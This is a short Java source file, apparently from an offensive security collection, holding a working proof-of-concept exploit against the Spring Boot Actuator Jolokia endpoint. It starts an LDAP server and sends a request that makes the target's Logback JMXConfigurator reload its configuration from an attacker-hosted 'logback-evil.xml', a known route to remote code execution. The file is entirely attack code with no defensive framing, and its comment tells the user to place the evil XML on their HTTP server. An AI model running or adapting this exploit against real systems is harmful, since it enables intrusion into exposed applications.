package com.threedr3am.bug.spring.actuator;

import com.threedr3am.bug.common.server.LdapServer;
import org.apache.http.client.methods.CloseableHttpResponse;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.impl.client.CloseableHttpClient;
import org.apache.http.impl.client.HttpClientBuilder;
import org.apache.http.impl.client.HttpClients;

/**
 * copy logback-evil.xml to http server root
 *
 * @author threedr3am
 */
public class JolokiaAttackForLogback {

  static {
    LdapServer.run();
  }

  public static void main(String[] args) {
    String target = "http://localhost:8080";
    String evilXML = "http:!/!/127.0.0.1:80!/logback-evil.xml";
    HttpGet httpGet = new HttpGet(target + "/jolokia/exec/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/reloadByURL/" + evilXML);
    try {
      HttpClientBuilder httpClientBuilder = HttpClients
          .custom()
          .disableRedirectHandling()
          .disableCookieManagement()
          ;

      CloseableHttpClient httpClient = null;
      CloseableHttpResponse response = null;
      try {
        httpClient = httpClientBuilder.build();
        response = httpClient.execute(httpGet);
      } finally {
        response.close();
        httpClient.close();
      }
    } catch (Exception e) {
      e.printStackTrace();
    }

  }
}
